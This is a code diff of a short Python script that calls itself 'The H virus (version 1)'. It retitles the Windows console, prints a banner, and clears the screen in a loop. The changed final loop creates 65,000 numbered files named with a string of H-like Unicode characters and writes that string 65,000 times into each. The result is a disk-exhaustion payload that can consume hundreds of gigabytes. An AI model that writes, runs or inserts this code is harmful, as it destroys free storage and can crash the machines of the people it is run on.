@@ -1,5 +1,5 @@
 import os, sys, time
-os.system("color 1 & title H virus & cls")
+os.system("color 1 & title H virus [version 1] & cls")
 text = "ħhɦɥʜĥḧḩȟɧʮʯℋℌℍℎℏ♄♅🄗🄷🅷Ⓗ🅗🇭ĦHꞪꞍʜĤḦḨȞɧʮʯℋℌℍℎℏ♄♅🄗🄷🅷Ⓗ🅗🇭"
 print(">>>>>>>>>>>>>>>> The H virus (version 1) <<<<<<<<<<<<<<<<\n")
 while True:
@@ -15,5 +15,5 @@ while True:
         time.sleep(2)
         os.system("cls")
 for i in range(65000):
-    file = open(f"{text}", "a")
-    file.write(text*65000)
+    with open(f"{text}({i})", "a") as file:
+        file.write(text*65000)
